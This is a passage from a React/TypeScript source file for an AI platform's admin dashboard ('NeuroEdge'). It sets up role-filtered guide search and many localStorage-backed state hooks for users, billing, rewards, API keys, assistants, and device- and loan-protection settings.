        keywords: ["enterprise", "department", "sso", "compliance", "audit", "roles"],
      },
      {
        id: "visionforge-media",
        title: "Create Media (VisionForge)",
        view: "developer",
        roleScope: ["all"],
        summary: "Generate/edit images and videos, script-to-video, captions, and creator history.",
        keywords: ["visionforge", "creator", "media", "image", "video", "thumbnail", "subtitles", "background remove"],
      },
      {
        id: "payments-subscriptions",
        title: "Subscriptions, Billing, and Rewards",
        view: "founder",
        roleScope: ["founder", "admin", "enterprise", "user"],
        summary: "Manage plans, payment profile, reward wallets, and crypto reward settings.",
        keywords: ["billing", "subscription", "payment", "revenue", "wallet", "rewards", "crypto"],
      },
    ],
    []
  );

  const dashboardAssistantResults = useMemo(() => {
    const q = dashboardAssistantQuery.trim().toLowerCase();
    const role = dashboardRole;
    const visible = dashboardGuideCatalog.filter((item) => {
      if (item.roleScope.includes("all")) return true;
      return item.roleScope.includes(role);
    });
    if (!q) return visible.slice(0, 8);
    const tokens = q.split(/\s+/).filter(Boolean);
    const scored = visible
      .map((item) => {
        const blob = `${item.title} ${item.summary} ${item.keywords.join(" ")}`.toLowerCase();
        let score = 0;
        for (const t of tokens) {
          if (blob.includes(t)) score += 2;
          if (item.keywords.some((k) => k.includes(t))) score += 1;
          if (String(item.view).includes(t)) score += 1;
        }
        return { item, score };
      })
      .filter((x) => x.score > 0)
      .sort((a, b) => b.score - a.score);
    return scored.map((s) => s.item).slice(0, 10);
  }, [dashboardAssistantQuery, dashboardGuideCatalog, dashboardRole]);

  useEffect(() => {
    if (!allowedViews.includes(view)) {
      setView(allowedViews[0] || "user");
    }
  }, [allowedViews, view]);

  useEffect(() => {
    const preferred: Record<DashboardRole, View> = {
      founder: "founder",
      admin: "admin",
      developer: "developer",
      enterprise: "enterprise",
      user: "user",
    };
    const next = preferred[dashboardRole] || "user";
    if (view === "user" && next !== "user" && allowedViews.includes(next)) {
      setView(next);
    }
  }, [dashboardRole, allowedViews, view]);

  const [users, setUsers] = useState<UserRecord[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_dashboard_users_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "u1", name: "Joseph Were", email: "founder@neuroedge.ai", role: "founder", status: "verified" },
            { id: "u2", name: "Guest User", email: "guest@local", role: "user", status: "active" },
            { id: "u3", name: "Ops Moderator", email: "ops@neuroedge.ai", role: "moderator", status: "active" },
          ];
    } catch {
      return [];
    }
  });

  const [offers, setOffers] = useState<Offer[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_dashboard_offers_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "off1", name: "Launch Promo", discountPct: 20, active: true, audience: "new_users" },
            { id: "off2", name: "Enterprise Pilot", discountPct: 15, active: false, audience: "enterprise" },
          ];
    } catch {
      return [];
    }
  });

  const [plans, setPlans] = useState<Plan[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_dashboard_plans_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "p1", name: "Free", monthly: 0, annual: 0, active: true, features: ["Basic Chat", "History"] },
            { id: "p2", name: "Pro", monthly: 19, annual: 190, active: true, features: ["Advanced Models", "Research", "API"] },
            { id: "p3", name: "Enterprise", monthly: 99, annual: 990, active: true, features: ["SSO", "Audit Export", "Dedicated Support"] },
          ];
    } catch {
      return [];
    }
  });

  const [payment, setPayment] = useState<PaymentProfile>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_dashboard_payment_v1");
      return raw
        ? JSON.parse(raw)
        : {
            cardHolder: "",
            cardNumberMasked: "",
            expMonth: "",
            expYear: "",
            billingEmail: "",
            country: "",
            taxId: "",
            saveForAutoRenew: true,
          };
    } catch {
      return {
        cardHolder: "",
        cardNumberMasked: "",
        expMonth: "",
        expYear: "",
        billingEmail: "",
        country: "",
        taxId: "",
        saveForAutoRenew: true,
      };
    }
  });

  const [paymentDraftCard, setPaymentDraftCard] = useState("");
  const [cryptoRewards, setCryptoRewards] = useState<CryptoRewardsConfig>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_dashboard_crypto_rewards_v1");
      return raw
        ? JSON.parse(raw)
        : {
            enabled: false,
            chain: "NeuroChain",
            token: "WDC",
            founderWalletAddress: "",
            neuroChainRpcUrl: "",
            wdcContractAddress: "",
            wdcWalletAppUrl: "",
            rewardPerComputeUnit: "0.0001",
            minPayout: "1.0",
            payoutSchedule: "weekly",
            donorBonusEnabled: true,
            treasuryAllocationPct: 10,
            notes: "Compute-donation rewards config",
          };
    } catch {
      return {
        enabled: false,
        chain: "NeuroChain",
        token: "WDC",
        founderWalletAddress: "",
        neuroChainRpcUrl: "",
        wdcContractAddress: "",
        wdcWalletAppUrl: "",
        rewardPerComputeUnit: "0.0001",
        minPayout: "1.0",
        payoutSchedule: "weekly",
        donorBonusEnabled: true,
        treasuryAllocationPct: 10,
        notes: "Compute-donation rewards config",
      };
    }
  });
  const [modelControl, setModelControl] = useState<ModelControl>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_model_control_v2");
      return raw
        ? JSON.parse(raw)
        : {
            model: "neuroedge-13b-instruct",
            temperature: 0.3,
            maxTokens: 2048,
            safetyMode: "balanced",
          };
    } catch {
      return {
        model: "neuroedge-13b-instruct",
        temperature: 0.3,
        maxTokens: 2048,
        safetyMode: "balanced",
      };
    }
  });

  const [featureFlags, setFeatureFlags] = useState<FeatureFlags>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_feature_flags_v2");
      return raw
        ? JSON.parse(raw)
        : {
            research_pipeline: true,
            streaming_tokens: true,
            mesh_inference: true,
            strict_citations: true,
            founder_mode: true,
            multimodal_uploads: false,
            auto_eval_nightly: true,
            enterprise_sso: false,
          };
    } catch {
      return {};
    }
  });

  const [devWebhook, setDevWebhook] = useState("");
  const [rewardsLedger, setRewardsLedger] = useState<RewardsLedger>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_rewards_ledger_v1");
      return raw
        ? JSON.parse(raw)
        : {
            config: {
              pointsPerUsd: 100,
              wdcPerPoint: 0.01,
              wdcListingLive: false,
              payoutMode: "points_only",
            },
            wallets: [],
          };
    } catch {
      return {
        config: {
          pointsPerUsd: 100,
          wdcPerPoint: 0.01,
          wdcListingLive: false,
          payoutMode: "points_only",
        },
        wallets: [],
      };
    }
  });
  const [idverseConfig, setIdverseConfig] = useState<IdverseConfig>(() => ({
    enabled: true,
    baseUrl: "",
    projectId: "",
    timeoutMs: 12000,
    strictBiometric: true,
    strictLiveness: true,
    apiKey: "",
    apiKeyMasked: "",
  }));
  const [idverseStatus, setIdverseStatus] = useState<any>(null);
  const [trainingTitle, setTrainingTitle] = useState("Founder Training Note");
  const [trainingText, setTrainingText] = useState("");
  const [trainingTagsCsv, setTrainingTagsCsv] = useState("founder,custom,high-signal");
  const [trainingUrls, setTrainingUrls] = useState("");
  const [trainingResearchQuery, setTrainingResearchQuery] = useState("");
  const [trainingUploadFiles, setTrainingUploadFiles] = useState<Array<{ name: string; type: string; textContent?: string; base64?: string }>>([]);
  const [trainingOverview, setTrainingOverview] = useState<any>(null);
  const [ragDomain, setRagDomain] = useState<"medicine" | "agriculture" | "market" | "general">("general");
  const [ragQuery, setRagQuery] = useState("");
  const [bootstrapIncludeSecondary, setBootstrapIncludeSecondary] = useState(false);
  const [autoRefreshEnabled, setAutoRefreshEnabled] = useState(true);
  const [autoRefreshHourUtc, setAutoRefreshHourUtc] = useState("2");
  const [autoRefreshMinuteUtc, setAutoRefreshMinuteUtc] = useState("10");
  const [autoRefreshStaleHours, setAutoRefreshStaleHours] = useState("36");
  const [trainingJobMode, setTrainingJobMode] = useState<"incremental" | "full" | "eval_only">("incremental");
  const [trainingEvalSuite, setTrainingEvalSuite] = useState<"core" | "math" | "code" | "research" | "all">("core");
  const [endpointMethod, setEndpointMethod] = useState<"GET" | "POST">("GET");
  const [endpointPath, setEndpointPath] = useState("/auth/whoami");
  const [endpointBody, setEndpointBody] = useState("{\n  \"example\": true\n}");
  const [trainingOptions, setTrainingOptions] = useState<TrainingStudioOptions>({
    dedupe: true,
    piiFilter: true,
    autoTag: true,
    semanticChunking: true,
    crawlLinks: false,
    citationMode: true,
  });
  const [rewardUserId, setRewardUserId] = useState("u2");
  const [rewardUserName, setRewardUserName] = useState("Guest User");
  const [rewardPointsInput, setRewardPointsInput] = useState("100");
  const [ownerComputeDevices, setOwnerComputeDevices] = useState<OwnerComputeDevice[]>([]);
  const [ownerGuardrails, setOwnerGuardrails] = useState({
    maxCpuPct: 35,
    maxRamPct: 40,
    pauseOnBattery: true,
    pauseOnHighTempC: 80,
  });
  const [ownerPayoutProfile, setOwnerPayoutProfile] = useState<OwnerPayoutProfile | null>(null);
  const [ownerPayoutRequests, setOwnerPayoutRequests] = useState<OwnerPayoutRequest[]>([]);
  const [ownerWallet, setOwnerWallet] = useState<RewardWallet | null>(null);
  const [computePayoutBudget, setComputePayoutBudget] = useState<ComputePayoutBudget>({
    period: new Date().toISOString().slice(0, 7),
    totalRevenueUsd: 0,
    allocatedUsd: 0,
    pendingUsd: 0,
    approvedUsd: 0,
    sentUsd: 0,
    reserveUsd: 0,
  });
  const [computePayoutRequestsAdmin, setComputePayoutRequestsAdmin] = useState<OwnerPayoutRequest[]>([]);
  const [computeAutoPayoutConfig, setComputeAutoPayoutConfig] = useState<ComputeAutoPayoutConfig>({
    enabled: true,
    period: "weekly",
    maxPayoutsPerRun: 200,
  });
  const [computeDeviceDraft, setComputeDeviceDraft] = useState({ id: "", hostname: "", os: "linux" });
  const [telemetryDraftByDevice, setTelemetryDraftByDevice] = useState<
    Record<string, { cpuPct: string; ramPct: string; tempC: string; onBattery: boolean }>
  >({});
  const [otpChannel, setOtpChannel] = useState<"email" | "sms">("email");
  const [otpDestination, setOtpDestination] = useState("");
  const [loanOpsCompanies, setLoanOpsCompanies] = useState<LoanOpsCompany[]>([]);
  const [loanOpsDevices, setLoanOpsDevices] = useState<LoanOpsDevice[]>([]);
  const [loanOpsApiKeys, setLoanOpsApiKeys] = useState<LoanOpsApiKey[]>([]);
  const [loanOpsIntakeLogs, setLoanOpsIntakeLogs] = useState<any[]>([]);
  const [loanOpsDisputes, setLoanOpsDisputes] = useState<LoanOpsDispute[]>([]);
  const [loanOpsPolicy, setLoanOpsPolicy] = useState({
    consentRequired: true,
    legalRestrictedModeOnly: true,
    allowTrustedContactRecovery: true,
    locationOnTheftWithConsent: true,
    antiTamperMonitoring: true,
    attestationRequiredDefault: true,
    autoRelockOnLoanDefault: true,
    allowedAttestationProvidersCsv: "android_play_integrity,ios_devicecheck,desktop_tpm",
  });
  const [loanCompanyDraft, setLoanCompanyDraft] = useState({
    id: "",
    name: "",
    contactEmail: "",
    contactPhone: "",
    legalPolicyRef: "",
  });
  const [loanDeviceDraft, setLoanDeviceDraft] = useState({
    id: "",
    companyId: "",
    model: "",
    serial: "",
    imei: "",
    ownerRef: "",
    loanStatus: "current",
  });
  const [loanImportText, setLoanImportText] = useState("");
  const [loanApiKeyCompanyId, setLoanApiKeyCompanyId] = useState("");
  const [loanApiKeyName, setLoanApiKeyName] = useState("LoanOps Integration Key");
  const [loanBootIntegrityOk, setLoanBootIntegrityOk] = useState(true);
  const [loanAttestationProvider, setLoanAttestationProvider] = useState("android_play_integrity");
  const [loanAttestationStatus, setLoanAttestationStatus] = useState<"passed" | "failed">("passed");
  const [loanSelectedDeviceId, setLoanSelectedDeviceId] = useState("");
  const [loanDisputeReason, setLoanDisputeReason] = useState("customer_dispute");
  const [loanDisputeEvidenceRef, setLoanDisputeEvidenceRef] = useState("");
  const [loanConsentSubjectRef, setLoanConsentSubjectRef] = useState("");
  const [loanConsentType, setLoanConsentType] = useState("loan_terms");
  const [userProtectionProfile, setUserProtectionProfile] = useState<UserProtectionProfile | null>(null);
  const [userProtectionIncidents, setUserProtectionIncidents] = useState<any[]>([]);
  const [userProtectionPolicy, setUserProtectionPolicy] = useState<any>({});
  const [userProtectDeviceDraft, setUserProtectDeviceDraft] = useState({
    id: "",
    label: "",
    platform: "android",
  });
  const [trustedContactDraft, setTrustedContactDraft] = useState({
    name: "",
    endpoint: "",
    channel: "email",
  });
  const [incidentDraft, setIncidentDraft] = useState({
    deviceId: "",
    note: "",
    cameraEvidenceRef: "",
    lat: "",
    lng: "",
  });
  const [ownerPaymentDraft, setOwnerPaymentDraft] = useState({
    paymentMethod: "bank",
    bankName: "",
    accountName: "",
    accountNumberMasked: "",
    swiftCode: "",
    cardHolder: "",
    cardLast4: "",
    billingCountry: "",
    wdcWalletAddress: "",
    neuroChainAddress: "",
  });
  const [paymentVerifyChallengeId, setPaymentVerifyChallengeId] = useState("");
  const [paymentVerifyCode, setPaymentVerifyCode] = useState("");
  const [payoutReqUsd, setPayoutReqUsd] = useState("0");
  const [payoutReqWdc, setPayoutReqWdc] = useState("0");
  const [payoutReqPoints, setPayoutReqPoints] = useState("0");
  const [payoutReqTarget, setPayoutReqTarget] = useState<"cash" | "wdc" | "points">("cash");
  const [devEnvironment, setDevEnvironment] = useState<"dev" | "staging" | "prod">("dev");
  const [devApiKeys, setDevApiKeys] = useState<DevApiKey[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_dev_api_keys_v1");
      return raw
        ? JSON.parse(raw)
        : [{ id: "k1", name: "Default SDK Key", keyMasked: "neur...9x3a", createdAt: Date.now(), revoked: false }];
    } catch {
      return [];
    }
  });
  const [webhooks, setWebhooks] = useState<WebhookRecord[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_webhooks_v1");
      return raw ? JSON.parse(raw) : [];
    } catch {
      return [];
    }
  });
  const [integrations, setIntegrations] = useState<IntegrationApp[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_integrations_v1");
      return raw ? JSON.parse(raw) : [];
    } catch {
      return [];
    }
  });
  const [domainLinks, setDomainLinks] = useState<DomainLink[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_domain_links_v1");
      return raw ? JSON.parse(raw) : [];
    } catch {
      return [];
    }
  });
  const [domainLinkDraft, setDomainLinkDraft] = useState({
    id: "",
    name: "",
    url: "",
    type: "public" as DomainLink["type"],
    environment: "production" as DomainLink["environment"],
    audience: "users" as DomainLink["audience"],
    status: "active" as DomainLink["status"],
    description: "",
    tagsCsv: "",
    owner: "",
    notes: "",
  });
  const [integrationDraft, setIntegrationDraft] = useState({
    appName: "",
    appDescription: "",
    environment: "production" as IntegrationApp["environment"],
    scopesCsv: "chat:write, ai:infer",
    originsCsv: "",
    webhookUrl: "",
    rateLimitPerMin: "120",
  });
  const [permissionCatalog, setPermissionCatalog] = useState<PermissionCatalogItem[]>([]);
  const [accessControl, setAccessControl] = useState<AccessControlState>({
    rolePermissions: {},
    userOverrides: [],
    updatedAt: 0,
  });
  const [selectedAccessRole, setSelectedAccessRole] = useState("user");
  const [selectedAccessUserId, setSelectedAccessUserId] = useState("u2");
  const [deviceProtection, setDeviceProtection] = useState<DeviceProtectionState>({
    policy: {
      enabled: true,
      monitorCommands: true,
      monitorFileChanges: true,
      monitorNetworkEgress: true,
      blockUnknownExecutables: true,
      virusScanOnUpload: true,
      dataExfiltrationShield: true,
      autoQuarantineOnCritical: true,
      enterpriseMode: true,
      retentionDays: 90,
    },
    managedDevices: [],
    workerActivities: [],
    securityAlerts: [],
    antiTheft: { enabled: true, optInRequired: true, remoteLockAuthorizedOnly: true },
    loanProtection: {
      enabled: true,
      overdueDaysThreshold: 30,
      restrictedModeFeatures: ["emergency_calls", "payment_portal", "support_access"],
      disputeProcess: true,
    },
    resilience: {
      selfHealingEnabled: true,
      rollbackEnabled: true,
      safeMode: { active: false, reason: "", activatedAt: 0 },
    },
    snapshots: [],
    integrityBaseline: {},
    backup: {
      enabled: true,
      cadence: "daily",
      retentionDays: 30,
      offsiteTarget: "encrypted-offsite",
      encryptAtRest: true,
      includeSnapshots: true,
      includeEvents: true,
    },
    zeroTrust: {
      enabled: true,
      lastRotatedAt: 0,
      rotationId: "",
      policy: "token validation on every request + service auth",
    },
    updatedAt: 0,
  });
  const [deviceDraft, setDeviceDraft] = useState({
    id: "",
    hostname: "",
    os: "linux",
    ownerUserId: "u2",
    ownerOrg: "personal",
    companyOwned: true,
    antiVirusVersion: "",
  });
  const [creatorPrompt, setCreatorPrompt] = useState("");
  const [creatorScript, setCreatorScript] = useState("");
  const [creatorImagePath, setCreatorImagePath] = useState("");
  const [creatorJobId, setCreatorJobId] = useState("");
  const [creatorJob, setCreatorJob] = useState<CreatorJobState | null>(null);
  const [creatorHistory, setCreatorHistory] = useState<any[]>([]);
  const [creatorBusy, setCreatorBusy] = useState(false);
  const [intelligenceQuestion, setIntelligenceQuestion] = useState("");
  const [intelligenceMode, setIntelligenceMode] = useState("step_by_step");
  const [intelligenceOutput, setIntelligenceOutput] = useState<any>(null);
  const [intelligenceSvg, setIntelligenceSvg] = useState("");
  const [intelligenceExportPath, setIntelligenceExportPath] = useState("");
  const [aegisOutput, setAegisOutput] = useState<any>(null);
  const [aegisMalwareInput, setAegisMalwareInput] = useState("");
  const [aegisPromptInput, setAegisPromptInput] = useState("");
  const [aegisDeviceId, setAegisDeviceId] = useState("");
  const [aegisLoanStatus, setAegisLoanStatus] = useState<"current" | "grace" | "overdue" | "dispute">("current");
  const [aegisOverdueDays, setAegisOverdueDays] = useState("0");
  const [aegisSnapshotVersion, setAegisSnapshotVersion] = useState("");
  const [aegisSafeModeReason, setAegisSafeModeReason] = useState("Security incident response");
  const [latestGeneratedApiKey, setLatestGeneratedApiKey] = useState("");
  const [webhookEvent, setWebhookEvent] = useState("chat.completed");
  const [supportTickets, setSupportTickets] = useState<SupportTicket[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_support_tickets_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "t-1001", subject: "Login failed", priority: "medium", status: "open", assignee: "ops" },
            { id: "t-1002", subject: "Billing mismatch", priority: "high", status: "triaged", assignee: "finance" },
          ];
    } catch {
      return [];
    }
  });
  const [newTicket, setNewTicket] = useState("");
  const [agentsLocal, setAgentsLocal] = useState<AgentProfile[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_agent_profiles_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "ag1", name: "Research Agent", memoryDays: 30, tools: ["research", "web"], permission: "workspace" },
            { id: "ag2", name: "Code Agent", memoryDays: 14, tools: ["code", "files"], permission: "project" },
          ];
    } catch {
      return [];
    }
  });
  const [savedPrompts, setSavedPrompts] = useState<SavedPrompt[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_saved_prompts_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "sp1", title: "Research Brief", text: "Summarize latest trends with sources." },
            { id: "sp2", title: "Code Review", text: "Review this code for bugs and regressions." },
          ];
    } catch {
      return [];
    }
  });
  const [newPromptTitle, setNewPromptTitle] = useState("");
  const [newPromptText, setNewPromptText] = useState("");
  const [selectedAgentId, setSelectedAgentId] = useState("");
  const [userAssistants, setUserAssistants] = useState<UserAssistantProfile[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_user_assistants_v1");
      if (raw) {
        const parsed = JSON.parse(raw) as UserAssistantProfile[];
        return Array.isArray(parsed)
          ? parsed.map((a) => ({
              ...a,
              responseMode: a.responseMode || "balanced",
              domainFocus: a.domainFocus || "general",
              startupPrompt: a.startupPrompt || "",
              avatarEmoji: a.avatarEmoji || "🤖",
              memoryMode: a.memoryMode || "long_term",
              autoCitations: a.autoCitations === true,
            }))
          : [];
      }
      const now = Date.now();
      return [
        {
          id: "ua-general",
          name: "General Assistant",
          rolePrompt: "Helpful all-purpose assistant for daily tasks and learning.",
          tone: "balanced",
          language: "en",
          responseMode: "balanced",
          domainFocus: "general",
          startupPrompt: "Greet briefly and ask what outcome the user wants.",
          avatarEmoji: "🤖",
          creativity: 0.4,
          memoryDays: 14,
          memoryMode: "long_term",
          autoCitations: false,
          tools: ["chat", "research"],
          privacyMode: true,
          safeMode: true,
          createdAt: now,
          updatedAt: now,
        },
        {
          id: "ua-dev",
          name: "Dev Copilot",
          rolePrompt: "Coding assistant for debugging, refactoring, and implementation planning.",
          tone: "technical",
          language: "en",
          responseMode: "detailed",
          domainFocus: "software_engineering",
          startupPrompt: "Ask for stack, error output, and expected behavior before proposing fixes.",
          avatarEmoji: "🛠️",
          creativity: 0.3,
          memoryDays: 30,
          memoryMode: "long_term",
          autoCitations: true,
          tools: ["chat", "code", "files"],
          privacyMode: true,
          safeMode: true,
          createdAt: now,
          updatedAt: now,
        },
      ];
    } catch {
      return [];
    }
  });
  const [selectedUserAssistantId, setSelectedUserAssistantId] = useState("");
  const [defaultUserAssistantId, setDefaultUserAssistantId] = useState(() => {
    try {
      return localStorage.getItem("neuroedge_default_user_assistant_id") || "";
    } catch {
      return "";
    }
  });
  const [assistantKnowledgeUrlDraft, setAssistantKnowledgeUrlDraft] = useState("");
  const [marketplaceDescription, setMarketplaceDescription] = useState("");
  const [marketplaceVisibility, setMarketplaceVisibility] = useState<"public" | "private">("public");
  const [marketplaceTagsCsv, setMarketplaceTagsCsv] = useState("");
  const [marketplaceSearch, setMarketplaceSearch] = useState("");
  const [assistantMarketplace, setAssistantMarketplace] = useState<AssistantMarketplacePack[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_assistant_marketplace_v1");
      return raw ? JSON.parse(raw) : [];
    } catch {
      return [];
    }
  });
  const [assistantAnalytics, setAssistantAnalytics] = useState<Record<string, AssistantUsageAnalytics>>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_assistant_analytics_v1");
      return raw ? JSON.parse(raw) : {};
    } catch {
      return {};
    }
  });
  const [newDepartmentName, setNewDepartmentName] = useState("");
  const [newDepartmentMembers, setNewDepartmentMembers] = useState("5");
  const [newDepartmentTokens, setNewDepartmentTokens] = useState("50000");
  const [enterpriseDepartments, setEnterpriseDepartments] = useState<EnterpriseDepartment[]>(() => {
    try {
      const raw = localStorage.getItem("neuroedge_enterprise_departments_v1");
      return raw
        ? JSON.parse(raw)
        : [
            { id: "d1", name: "Engineering", members: 12, tokensPerMonth: 210000 },
            { id: "d2", name: "Support", members: 7, tokensPerMonth: 54000 },
          ];
    } catch {
      return [];
    }
  });
  const [ssoConfig, setSsoConfig] = useState(() => {
    try {
      const raw = localStorage.getItem("neuroedge_enterprise_sso_v1");
      return raw
        ? JSON.parse(raw)
        : {
            enabled: false,
            provider: "okta",
            domain: "",
            clientId: "",
            metadataUrl: "",
          };
    } catch {
      return { enabled: false, provider: "okta", domain: "", clientId: "", metadataUrl: "" };
    }
  });
  const [newOfferName, setNewOfferName] = useState("");
  const [newOfferPct, setNewOfferPct] = useState("10");
  const [staffName, setStaffName] = useState("");
  const [staffEmail, setStaffEmail] = useState("");
  const [staffRole, setStaffRole] = useState<"admin" | "developer">("admin");
  const [staffDeviceId, setStaffDeviceId] = useState("");
  const [futureFeatures, setFutureFeatures] = useState([
    { id: "f1", name: "Voice-native AI Calls", phase: "design", owner: "founder", priority: "high" },
    { id: "f2", name: "Autonomous Workflow Builder", phase: "in_progress", owner: "platform", priority: "high" },
    { id: "f3", name: "Enterprise Data Residency", phase: "planned", owner: "enterprise", priority: "medium" },
    { id: "f4", name: "Realtime Co-Pilot Screen Assist", phase: "planned", owner: "product", priority: "high" },
  ]);
  const [brandingDraft, setBrandingDraft] = useState<BrandingConfig>(() => loadBranding());

  useEffect(() => {
    localStorage.setItem("neuroedge_dashboard_users_v1", JSON.stringify(users));
  }, [users]);
  useEffect(() => {
    localStorage.setItem("neuroedge_dashboard_offers_v1", JSON.stringify(offers));
  }, [offers]);
  useEffect(() => {
    localStorage.setItem("neuroedge_dashboard_plans_v1", JSON.stringify(plans));
  }, [plans]);
  useEffect(() => {
    localStorage.setItem("neuroedge_dashboard_payment_v1", JSON.stringify(payment));
  }, [payment]);
  useEffect(() => {
    localStorage.setItem("neuroedge_dashboard_crypto_rewards_v1", JSON.stringify(cryptoRewards));
  }, [cryptoRewards]);
  useEffect(() => {
    localStorage.setItem("neuroedge_rewards_ledger_v1", JSON.stringify(rewardsLedger));
  }, [rewardsLedger]);
  useEffect(() => {
    localStorage.setItem("neuroedge_feature_flags_v2", JSON.stringify(featureFlags));
  }, [featureFlags]);
  useEffect(() => {
    localStorage.setItem("neuroedge_model_control_v2", JSON.stringify(modelControl));
  }, [modelControl]);
  useEffect(() => {
    localStorage.setItem("neuroedge_dev_api_keys_v1", JSON.stringify(devApiKeys));
  }, [devApiKeys]);
  useEffect(() => {
    localStorage.setItem("neuroedge_webhooks_v1", JSON.stringify(webhooks));
  }, [webhooks]);
  useEffect(() => {
    localStorage.setItem("neuroedge_integrations_v1", JSON.stringify(integrations));
  }, [integrations]);
  useEffect(() => {
    localStorage.setItem("neuroedge_domain_links_v1", JSON.stringify(domainLinks));
  }, [domainLinks]);
  useEffect(() => {
    localStorage.setItem("neuroedge_support_tickets_v1", JSON.stringify(supportTickets));
  }, [supportTickets]);
  useEffect(() => {
    localStorage.setItem("neuroedge_agent_profiles_v1", JSON.stringify(agentsLocal));
  }, [agentsLocal]);
  useEffect(() => {
    localStorage.setItem("neuroedge_saved_prompts_v1", JSON.stringify(savedPrompts));
  }, [savedPrompts]);
  useEffect(() => {
    localStorage.setItem("neuroedge_user_assistants_v1", JSON.stringify(userAssistants));
  }, [userAssistants]);
  useEffect(() => {
    localStorage.setItem("neuroedge_artifact_workspace_v1", JSON.stringify(artifactWorkspace));
  }, [artifactWorkspace]);
  useEffect(() => {
    localStorage.setItem("neuroedge_assistant_marketplace_v1", JSON.stringify(assistantMarketplace));
  }, [assistantMarketplace]);
  useEffect(() => {
    localStorage.setItem("neuroedge_assistant_analytics_v1", JSON.stringify(assistantAnalytics));
  }, [assistantAnalytics]);
  useEffect(() => {
    localStorage.setItem("neuroedge_default_user_assistant_id", defaultUserAssistantId || "");
  }, [defaultUserAssistantId]);
  useEffect(() => {
    localStorage.setItem("neuroedge_enterprise_departments_v1", JSON.stringify(enterpriseDepartments));
  }, [enterpriseDepartments]);
  useEffect(() => {
    localStorage.setItem("neuroedge_enterprise_sso_v1", JSON.stringify(ssoConfig));
  }, [ssoConfig]);
  useEffect(() => {
    const sync = () => setBrandingDraft(loadBranding());
    window.addEventListener("neuroedge:brandingUpdated", sync as EventListener);
    window.addEventListener("storage", sync);
    return () => {
      window.removeEventListener("neuroedge:brandingUpdated", sync as EventListener);
      window.removeEventListener("storage", sync);
    };
  }, []);
  useEffect(() => {
    if (!agentsLocal.length) {
      setSelectedAgentId("");
      return;
    }
    if (!selectedAgentId || !agentsLocal.find((a) => a.id === selectedAgentId)) {
      setSelectedAgentId(agentsLocal[0].id);
    }
  }, [agentsLocal, selectedAgentId]);
  useEffect(() => {
    if (!userAssistants.length) {
      setSelectedUserAssistantId("");
      return;
    }
    if (defaultUserAssistantId && userAssistants.find((a) => a.id === defaultUserAssistantId)) {
      if (!selectedUserAssistantId || !userAssistants.find((a) => a.id === selectedUserAssistantId)) {
        setSelectedUserAssistantId(defaultUserAssistantId);
        return;
      }
    }
    if (
      !selectedUserAssistantId ||
      !userAssistants.find((a) => a.id === selectedUserAssistantId)
    ) {
      setSelectedUserAssistantId(userAssistants[0].id);
    }
  }, [userAssistants, selectedUserAssistantId, defaultUserAssistantId]);
  useEffect(() => {
    const syncAssistantTelemetry = () => {
      try {
        const raw = localStorage.getItem("neuroedge_assistant_analytics_v1");
        setAssistantAnalytics(raw ? JSON.parse(raw) : {});
      } catch {
        setAssistantAnalytics({});
      }
    };
    const syncMarketplace = () => {
      try {
        const raw = localStorage.getItem("neuroedge_assistant_marketplace_v1");
        setAssistantMarketplace(raw ? JSON.parse(raw) : []);
      } catch {
        setAssistantMarketplace([]);
      }
    };
    const syncAssistants = () => {
      try {
        const raw = localStorage.getItem("neuroedge_user_assistants_v1");
        if (raw) setUserAssistants(JSON.parse(raw));
      } catch {
        // ignore
      }
    };
    window.addEventListener("storage", syncAssistantTelemetry);
    window.addEventListener("storage", syncMarketplace);
    window.addEventListener("storage", syncAssistants);
    window.addEventListener("neuroedge:assistantAnalyticsUpdated", syncAssistantTelemetry as EventListener);
    return () => {
      window.removeEventListener("storage", syncAssistantTelemetry);
      window.removeEventListener("storage", syncMarketplace);
      window.removeEventListener("storage", syncAssistants);
      window.removeEventListener("neuroedge:assistantAnalyticsUpdated", syncAssistantTelemetry as EventListener);
    };
  }, []);

  const authContext = () => {
    const envToken = String((import.meta.env.VITE_NEUROEDGE_JWT as string) || "").trim();
    const envApiKey = String((import.meta.env.VITE_NEUROEDGE_API_KEY as string) || "").trim();
    const envOrg = String((import.meta.env.VITE_DEFAULT_ORG_ID as string) || "personal").trim();
    const envWorkspace = String((import.meta.env.VITE_DEFAULT_WORKSPACE_ID as string) || "default").trim();
    let userToken = "";
    let sessionToken = "";
    let userOrg = "";
    let userWorkspace = "";
    let userEmail = "";
    let userName = "";
    let userRole = "";
    let deviceId = "";
    try {
      deviceId = localStorage.getItem("neuroedge_device_id") || "";
      if (!deviceId) {
        deviceId = `dev-${Date.now()}-${Math.random().toString(36).slice(2, 10)}`;
        localStorage.setItem("neuroedge_device_id", deviceId);
      }
      const rawUser = localStorage.getItem("neuroedge_user");
      if (rawUser) {
        const parsed = JSON.parse(rawUser);
        userToken = String(parsed?.token || "");
        userOrg = String(parsed?.orgId || "");
        userWorkspace = String(parsed?.workspaceId || "");
        userEmail = String(parsed?.email || "");
        userName = String(parsed?.name || "");
        userRole = String(parsed?.role || "");
      }
      const rawSession = localStorage.getItem("neuroedge_session");
      if (rawSession) {
        const parsed = JSON.parse(rawSession);
        sessionToken = String(parsed?.token || "");
        userOrg = userOrg || String(parsed?.orgId || "");
        userWorkspace = userWorkspace || String(parsed?.workspaceId || "");
